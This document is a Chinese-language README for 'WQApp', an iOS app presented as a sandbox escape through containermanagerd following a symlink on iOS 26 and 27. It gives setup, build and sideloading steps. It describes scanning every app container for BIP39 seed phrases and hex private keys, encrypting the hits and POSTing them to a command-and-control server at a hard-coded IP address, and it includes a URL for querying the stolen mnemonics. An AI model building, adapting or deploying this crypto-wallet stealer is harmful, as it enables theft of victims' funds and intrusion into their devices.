# WQApp — iOS 26/27 容器横扫器

基于 `worse_query` 沙箱逃逸。不越狱、不用内核漏洞，
只是让 containermanagerd 跟着一个符号链接走。

## 支持范围

```
iOS 26.0 ~ 26.7.2
iOS 27.0 ~ 27.2
未修于 27.2.1
```

## 编译前必须改的两处

打开 `WQApp/Config.h`：

```objc
// 1. App Group 标识符 — 必须是你在开发者后台建好并绑定到 App ID 的那个
#define kAppGroup   @"group.com.trxstation.wq"

// 2. C2 接收地址
#define kC2URL      @"http://206.187.220.116:8889/api/collect"
```

同时改 `WQApp/WQApp.entitlements` 里的 group 字符串，两处必须一致。

## 编译

### 方式一：GitHub Actions（Windows 上也能用）

1. 新建一个 GitHub 仓库，把整个 `wqapp` 目录推上去
2. `.github/workflows/build.yml` 会自动跑
3. 跑完在 Actions 页面的 Artifacts 里下载 `WQApp-unsigned-ipa`
4. 全程无需 Mac

### 方式二：本地 Mac

```bash
xcodebuild -project WQApp.xcodeproj -scheme WQApp \
  -sdk iphoneos -configuration Release \
  CODE_SIGNING_ALLOWED=NO clean build
```

产物在 `build/Release-iphoneos/WQApp.app`。

## 安装

未签名 IPA 需要自己签。

### AltStore / SideStore

1. 把 IPA 拖进 AltStore
2. **必须在 Xcode 里手动配置 App Group**，或者用 SideStore 的自动签名
3. 免费 Apple ID：7 天有效期
4. 付费开发者：1 年

### 关键：App Group 必须真的存在

免费 Apple ID 能带 App Group，但有前提：

- **不能用通配符 App ID** — 必须是显式 App ID
- 必须在 Apple Developer 后台或 Xcode 里先创建一个 App Group Identifier
- 然后把这个 group 绑定到你的 App ID 上

AltStore / SideStore / Impactor 会自动生成对应的 provisioning profile。
Sideloadly 打包的装不上（它带的 profile 里没有 App Group 权限）。

## 它做什么

1. 拿 App Group 的 `Library/Caches`
2. 换成指向目标容器的符号链接
3. 向 `containermanagerd` 申请 sandbox extension
4. 管理器解析链接，为目标签发 extension，不校验目标是否还在容器内
5. 消费这个 token，沙箱范围就覆盖了目标

拿到范围之后：

- 枚举 `/private/var/mobile/Containers/Data/Application/*`
- 枚举 `/private/var/mobile/Containers/Shared/AppGroup/*`
- 读每个容器的 `.com.apple.mobile_container_manager.metadata.plist` 拿 bundle id
- 遍历容器内文件，正则匹配 BIP39 助记词（12/15/18/21/24 词）和 64 位 hex 私钥
- gzip + AES-256-CBC 加密后 POST 到 C2

## 文件结构

```
WQApp/
  Config.h            ← 改这里
  main.m
  AppDelegate.h/m
  ViewController.h/m  ← 状态页，显示进度和命中数
  worse_query.h/m     ← 沙箱逃逸核心
  WQScanner.h/m       ← 容器枚举 + 助记词提取 + 上传
  Info.plist
  WQApp.entitlements  ← 和 Config.h 的 group 保持一致
```

## 局限

- Keychain 不在 worse_query 的范围里。`kSecClassGenericPassword` 那些条目拿不到，
  需要 root 级访问。
- App 第一次启动时 iOS 可能弹「App 想访问其他 App 的数据」，取决于具体系统版本。
  26.x 上目前不弹。
- 免签证书 7 天过期后要重签。

## 调试

App 内状态页会实时打印：

```
✓ App Group: /private/var/mobile/Containers/Shared/AppGroup/<UUID>
枚举容器...
容器根 142 项
AppGroup 根 38 项
共 180 个容器待扫
★ com.tokencore.wallet.tronlink  命中 2
...
打包 2 条命中...
上传 18432 B → http://...
✓ 已送达 HTTP 200
```

Xcode 里看 `Console.app` 或者 `idevicesyslog` 也能抓到 `[WQ]` / `[WQScanner]` 前缀的日志。

## C2 侧

服务器上用已有的 `c2_server.py`，监听 8889 的 `/api/collect`。
它用同一个 `C2_AES_KEY` 解密，gzip 解压，落进 SQLite。

查结果：

```
http://206.187.220.116:8888/api/mnemonics?limit=200
```
